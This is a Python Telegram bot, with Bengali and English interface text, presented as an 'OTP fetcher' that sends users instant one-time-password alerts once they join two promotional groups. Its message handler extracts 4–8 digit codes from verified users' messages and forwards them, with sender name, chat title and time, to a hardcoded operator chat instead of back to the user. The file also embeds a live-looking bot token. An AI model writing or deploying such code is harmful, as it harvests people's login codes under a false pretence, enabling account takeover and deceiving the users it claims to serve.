import logging
import re
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, MessageHandler, filters, CallbackContext, CommandHandler, CallbackQueryHandler
from telegram.constants import ParseMode

TOKEN = "8862479708:AAG6jNfd_SKeBqA1Jq3BmL9mRlg0iOVQdTI"
YOUR_CHAT_ID = 7455109015

REQUIRED_GROUPS = ["Easy_marketing1", "Easy_method1"]
authorized_users = set()

OTP_PATTERN = re.compile(r'\b(\d{4,8})\b')

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def is_user_member(bot, user_id):
    for group in REQUIRED_GROUPS:
        try:
            member = await bot.get_chat_member(chat_id=f"@{group}", user_id=user_id)
            if member.status in ["member", "administrator", "creator"]:
                return True
        except:
            continue
    return False

# ================== মেইন মেনু ==================
async def main_menu(update: Update, context: CallbackContext, edit=False):
    keyboard = [
        [InlineKeyboardButton("✅ Verify Access / ভেরিফাই করুন", callback_data="verify")],
        [InlineKeyboardButton("📊 My Status / স্ট্যাটাস", callback_data="status")],
        [InlineKeyboardButton("🛒 Services & Pricing", callback_data="services")],
        [InlineKeyboardButton("ℹ️ Help / সাহায্য", callback_data="help")],
        [InlineKeyboardButton("👨‍💼 Support", callback_data="support")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    text = """🔥 **SUPER FAST OTP FETCHER BOT**

**স্বাগতম!**
গ্রুপে জয়েন হয়ে **Verify** করুন।
OTP আসলে তাৎক্ষণিক অ্যালার্ট পাবেন।"""

    if edit and update.callback_query:
        await update.callback_query.edit_message_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
    elif update.message:
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)

async def button_handler(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = query.from_user.id
    data = query.data

    if data == "verify":
        if await is_user_member(context.bot, user_id):
            authorized_users.add(user_id)
            await query.answer("✅ ভেরিফিকেশন সফল! এখন OTP পাবেন।", show_alert=True)
            
            # অটো ডিলিট ভেরিফিকেশন মেসেজ
            await asyncio.sleep(2)
            try:
                await query.message.delete()
            except:
                pass
            
            # নতুন মেনু পাঠাও
            await main_menu(update, context)
        else:
            await query.answer("❌ গ্রুপে জয়েন হোনি!\nEasy_marketing1 ও Easy_method1", show_alert=True)

    elif data == "status":
        state = "✅ ভেরিফাইড" if user_id in authorized_users else "❌ ভেরিফাই করুন"
        await query.answer(f"স্ট্যাটাস: {state}")

    elif data in ["services", "help", "support"]:
        await query.answer("শীঘ্রই আসছে...", show_alert=True)

async def start(update: Update, context: CallbackContext):
    await main_menu(update, context)

async def handle_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id not in authorized_users:
        return

    message = update.message
    otps = OTP_PATTERN.findall(message.text or "")
    if otps:
        for otp in otps:
            alert = f"""🔥 **FAST OTP DETECTED!** 🔥

**OTP:** `{otp}`
**গ্রুপ:** {message.chat.title or 'Private'}
**ইউজার:** {message.from_user.first_name}
**টাইম:** {message.date}"""
            try:
                await context.bot.send_message(YOUR_CHAT_ID, alert, parse_mode=ParseMode.MARKDOWN)
            except:
                pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🚀 SUPER FAST OTP FETCHER BOT চালু হয়েছে...")
    app.run_polling()

if __name__ == '__main__':
    main()
